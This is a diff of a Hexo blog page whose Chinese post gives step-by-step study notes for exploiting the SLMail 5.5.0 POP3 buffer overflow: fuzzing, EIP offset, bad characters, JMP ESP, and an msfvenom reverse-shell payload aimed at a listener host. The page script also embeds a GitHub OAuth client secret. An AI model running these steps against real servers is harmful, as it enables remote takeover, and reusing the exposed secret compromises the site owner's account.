@@ -157,7 +157,7 @@
     </script>
     
     <script defer type="text/javascript" src="/js/custom.js"></script>
-    <title>归档 | Pyrrhax</title>
+    <title>缓冲区溢出 | Pyrrhax</title>
   <meta name="generator" content="Hexo 4.2.1"></head>
   <body itemscope itemtype="http://schema.org/WebPage" lang="zh_CN"  data-spy="scroll" data-target=".list-group">
     
@@ -199,106 +199,225 @@
         <div class="main-container">
           <div class="content">
             
-<div id="archive" class="archive page">
-  <h1 class="page-title">归档</h1>
-  <h2 class="page-counter">
-    
-    你已经写了 24 篇文章！
-    
-  </h2>
-  
-  
-  
-  
-  <h2 class="page-title">2020</h1>
+<div id="post" class="page">
   
   <article class="article post card" itemscope itemtype="http://schema.org/Article">
-    <header id="post-header" class="post-header">
-      <h1 class="post-title-simple" itemprop="name headline">
-        <a class="post-title-link post-title-link-external" href="/2020/08/28/WireShark&TCPdump/" itemprop="url">WireShark&TCPdump</a>
-      </h1>
-      
-      <span class="post-date">
-        <time title="post-date" itemprop="dateCreated datePublished" datetime="2020-08-28T17:06:29+08:00">08-28</time>
+    <div class="post-block">
+      <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/09/19/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/">
+      <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+       <meta itemprop="name" content="Pyrrhax">
+       <meta itemprop="description" content="">
+       <meta itemprop="image" content="/images/avatar.png">
       </span>
-      
+      <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+       <meta itemprop="name" content="Pyrrhax">
+      </span>
+    </div>
+    <header class="post-header">
+      <h1 class="post-title" itemprop="name headline">缓冲区溢出</h1>
+      <div class="post-meta">
+        
+        <span class="post-date">
+          <i class="far fa-calendar-plus"></i><span><time title="post-date" itemprop="dateCreated datePublished" datetime="2020-09-19T12:16:47+08:00">2020-09-19 12:16:47</time></span>
+        </span>
+        
+        
+        
+        <span class="post-meta-divider divider">|</span>
+        
+        <span class="post-categories">
+          
+          <i class="far fa-folder-open"></i><span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a></span><i class="fas fa-angle-right"></i><span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a></span>
+        </span>
+        
+        
+        
+        
+      </div>
     </header>
+    <main class="post-main" itemprop="articleBody">
+      <h2 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h2><ul>
+<li>当缓冲区边界限制不严格时，由于变量传入畸形数据或程序运行错误，导致缓冲区被“撑爆”，从而覆盖了相邻内存区域的数据</li>
+<li>成功修改内存数据，可造成进程劫持，执行恶意代码，获取服务器控制权等后果</li>
+</ul>
+<a id="more"></a>
+
+<h2 id="如何发现漏洞"><a href="#如何发现漏洞" class="headerlink" title="如何发现漏洞"></a>如何发现漏洞</h2><ul>
+<li>源码审计</li>
+<li>逆向工程</li>
+<li>模糊测试<ul>
+<li>向程序堆栈发送半随机的数据，根据内存变化判断溢出</li>
+<li>数据生成器：生成随机、半随机数据</li>
+<li>测试工具：识别溢出漏洞</li>
+</ul>
+</li>
+</ul>
+<h2 id="FUZZING"><a href="#FUZZING" class="headerlink" title="FUZZING"></a>FUZZING</h2><ul>
+<li><p>SLMail 5.5.0 Mail Server</p>
+<ul>
+<li>POP3 PASS命令存在缓冲区溢出漏洞</li>
+<li>无需身份验证远程代码执行</li>
+<li>防护机制：<ul>
+<li>DEP: 阻止代码从数据页被执行</li>
+<li>ASLR: 随机内存地址加载执行程序和DLL,每次重启地址变化</li>
+</ul>
+</li>
+</ul>
+<h3 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h3><ol>
+<li><p>测试PASS命令接收到大量数据时是否会溢出</p>
+</li>
+<li><p>找到精确溢出到EIP的4个字节</p>
+<ul>
+<li><p>二分法 </p>
+</li>
+<li><p>唯一字符串法</p>
+</li>
+</ul>
+</li>
+</ol>
+<ul>
+<li>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb 2700</li>
+<li>上一条命令即<code>msf-pattern_create -l 2700</code></li>
+<li>然后使用<code>msf-pattern_offset -q Di9D</code></li>
+</ul>
+<ol start="3">
+<li>找出坏字符</li>
+</ol>
+</li>
+<li><p>不同类型的程序、协议、漏洞，会将某些字符认为是坏字符，这些字符有固定用途</p>
+<ul>
+<li>返回地址、Shellcode、buffer中都不能出现坏字符</li>
+<li>null (0x00)空字符，用于终止字符串的拷贝操作</li>
+<li>return (0x0D) 回车操作，表示POP3 PASS命令输入完成</li>
+<li>思路：发送0x00-0xff 256个字符，查找所有坏字符</li>
+</ul>
+<ol start="4">
+<li>重定向数据流</li>
+</ol>
+</li>
+<li><p>用ESP地址替换EIP的值，但是ESP地址变化，不可硬编码。SLMail线程应用程序，操作系统为每个线程分配一段地址范围，每个线程地址范围不确定</p>
+<ul>
+<li>在内存中寻找地址固定的系统模块，在模块中寻找JMP ESP指令的地址跳转，再由该指令简介跳转到ESP，从而执行shellcode</li>
+<li>mona.py脚本识别内存模块，搜索“return address”是JMP ESP指令的模块</li>
+<li>寻找无DEP、ALSR保护的内存地址</li>
+<li>内存地址不包含坏字符</li>
+</ul>
+</li>
+<li><p>寻找不受保护的系统模块</p>
+<ul>
+<li>!mona modules</li>
+</ul>
+</li>
+<li><p>将汇编指令jmp esp转换为二进制</p>
+<ul>
+<li><code>./nasm_shell.rb</code>或 <code>msf-nasm_shell</code></li>
+<li>FFE4</li>
+</ul>
+</li>
+<li><p>在模块中搜索FFE4指令</p>
+<ul>
+<li><code>!mona find -s &quot;\xff\xe4&quot; -m slmfc.dll</code></li>
+<li>选择不包含坏字符的内存地址</li>
+</ul>
+</li>
+<li><p>在该地址设置断点</p>
+</li>
+<li><p>重发buffer</p>
+<ol start="5">
+<li>生成Shellcode</li>
+</ol>
+</li>
+<li><p>在msfvenom查找相应的payload</p>
+<figure class="hljs highlight plain"><figcaption><span>--list payloads|grep windows|grep reverse_tcp```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs msfvenom"><br>- 查看该payload生成需要哪些参数<br><br>  &#96;&#96;&#96;msfvenom -p windows&#x2F;shell_reverse_tcp --list-options<br></code></pre></td></tr></table></figure>
+</li>
+<li><p><code>msfvenom --platform Windows -b &#39;\x00\x0a\x0d&#39; -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.0.112 -f py</code>  </p>
+</li>
+</ul>
+<ol start="6">
+<li>在本地侦听4444端口（msfvenom没有写端口参数时的默认端口），执行脚本，拿到控制权。</li>
+</ol>
+<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><ul>
+<li>汇编指令<ul>
+<li>JMP XXX         跳转到某寄存器</li>
+<li>ADD XXX,12  XXX寄存器后移12位 </li>
+</ul>
+</li>
+<li>注意fuzzing要步步为营，否则很容易混乱。</li>
+</ul>
+
+    </main>
+    <footer class="post-footer">
+      
+      <div class="post-tags">
+        
+        <a class="post-tag button" href="/tags/KaliLinux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag"><i class="fas fa-tags"></i>KaliLinux渗透测试学习笔记</a>
+        
+      </div>
+      
+    </footer>
   </article>
   
   
-  <article class="article post card" itemscope itemtype="http://schema.org/Article">
-    <header id="post-header" class="post-header">
-      <h1 class="post-title-simple" itemprop="name headline">
-        <a class="post-title-link post-title-link-external" href="/2020/08/27/%E7%BD%91%E7%BB%9C%E5%B7%A5%E5%85%B7%E4%B8%AD%E7%9A%84%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80-NETCAT/" itemprop="url">网络工具中的瑞士军刀-NETCAT</a>
-      </h1>
+  <nav class="page-nav">
+    <div class="page-nav-next page-nav-item">
       
-      <span class="post-date">
-        <time title="post-date" itemprop="dateCreated datePublished" datetime="2020-08-27T18:24:08+08:00">08-27</time>
-      </span>
+      <a href="/2020/09/18/SLMail%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AE%9E%E8%B7%B5/" rel="next" title="SLMail缓冲区溢出实践"><i class="fas fa-angle-left"></i><span class="nav-title">SLMail缓冲区溢出实践</span></a>
       
-    </header>
-  </article>
-  
-  
-  <article class="article post card" itemscope itemtype="http://schema.org/Article">
-    <header id="post-header" class="post-header">
-      <h1 class="post-title-simple" itemprop="name headline">
-        <a class="post-title-link post-title-link-external" href="/2020/08/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" itemprop="url">渗透测试实验环境搭建</a>
-      </h1>
+    </div>
+    <div class="page-nav-prev page-nav-item">
       
-      <span class="post-date">
-        <time title="post-date" itemprop="dateCreated datePublished" datetime="2020-08-26T23:10:08+08:00">08-26</time>
-      </span>
-      
-    </header>
-  </article>
-  
-  
-  <article class="article post card" itemscope itemtype="http://schema.org/Article">
-    <header id="post-header" class="post-header">
-      <h1 class="post-title-simple" itemprop="name headline">
-        <a class="post-title-link post-title-link-external" href="/2020/08/21/Kali%E5%AE%9A%E5%88%B6/" itemprop="url">Kali定制</a>
-      </h1>
-      
-      <span class="post-date">
-        <time title="post-date" itemprop="dateCreated datePublished" datetime="2020-08-21T22:52:53+08:00">08-21</time>
-      </span>
-      
-    </header>
-  </article>
-  
-  
-  <article class="article post card" itemscope itemtype="http://schema.org/Article">
-    <header id="post-header" class="post-header">
-      <h1 class="post-title-simple" itemprop="name headline">
-        <a class="post-title-link post-title-link-external" href="/2020/08/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%88%9D%E6%8E%A2/" itemprop="url">渗透测试及Kali初探</a>
-      </h1>
-      
-      <span class="post-date">
-        <time title="post-date" itemprop="dateCreated datePublished" datetime="2020-08-19T12:22:38+08:00">08-19</time>
-      </span>
-      
-    </header>
-  </article>
-  
-  
-  <article class="article post card" itemscope itemtype="http://schema.org/Article">
-    <header id="post-header" class="post-header">
-      <h1 class="post-title-simple" itemprop="name headline">
-        <a class="post-title-link post-title-link-external" href="/2020/08/18/%E7%82%B9%E5%87%BB%E4%B8%8A%E6%96%B9%E7%9A%84%E5%85%B3%E4%BA%8E%E6%9F%A5%E7%9C%8B%E6%88%91%E7%9A%84%E6%9B%B4%E5%A4%9A%E4%BF%A1%E6%81%AF/" itemprop="url">点击上方的关于查看我的更多信息</a>
-      </h1>
-      
-      <span class="post-date">
-        <time title="post-date" itemprop="dateCreated datePublished" datetime="2020-08-18T19:01:16+08:00">08-18</time>
-      </span>
-      
-    </header>
-  </article>
-  
-  
-  <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/archives/2020/"><i class="fas fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/archives/2020/">1</a><span class="page-number current">2</span>
+    </div>
   </nav>
+  
+  
+  
+
+<div class="comments" id="comments">
+  
+  
+  <div class="commentjs" id="comment-thread"></div>
+  <link rel="stylesheet" href="/css/commentjs.css">
+  <script defer type="text/javascript" src="/js/marked.min.js"></script>
+  <script defer type="text/javascript" src="/js/timeago.min.js"></script>
+  <script defer type="text/javascript" src="/js/highlight.min.js"></script>
+  <script defer type="text/javascript" src="/js/commentjs.js"></script>
+  <script type="text/javascript">
+  $(document).ready(function () {
+    getComments({
+      "type": "github",
+      "user": "Pyrrhax",
+      "repo": "Pyrrhax.github.io",
+      "client_id": "ab41dde59a0f57819b1e",
+      "client_secret": "71b8ae2203a2a15d590a6866959b732267194412",
+      "no_comment": "这个页面还没有评论，现在就去评论吧！",
+      "go_to_comment": "去评论",
+      "issue_title": "缓冲区溢出",
+      "btn_class": "button",
+      "comments_target": "#comment-thread"
+    });
+    marked.setOptions({
+      "highlight": function (code, lang) {
+        return hljs.highlightAuto(code).value;
+      }
+    });
+    function mark() {
+      var markdowns = document.getElementsByClassName("markdown");
+      for (var i = 0; i < markdowns.length; ++i){
+        if (markdowns[i].innerHTML) {
+          markdowns[i].innerHTML = marked(markdowns[i].innerHTML);
+        }
+      }
+    }
+    window.addEventListener("DOMContentLoaded", mark, false);
+    window.addEventListener("load", mark, false);
+  });
+  </script>
+  
+  
+</div>
+
+
+
   
 </div>
 
@@ -359,6 +478,17 @@
 
 
   <div class="sidebar-sticky">
+    
+    
+    
+    
+    
+    <hr>
+    <div class="post-toc sidebar-item" id="toc-div">
+      <div><i class="fas fa-list-ol"></i>文章目录</div>
+      <div class="post-toc-content"><ol class="list-group toc"><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#缓冲区溢出"><span class="toc-text">缓冲区溢出</span></a></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#如何发现漏洞"><span class="toc-text">如何发现漏洞</span></a></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#FUZZING"><span class="toc-text">FUZZING</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#步骤："><span class="toc-text">步骤：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="list-group-item toc-link" href="#其它"><span class="toc-text">其它</span></a></li></ol></div>
+    </div>
+    
     
     
     <hr>
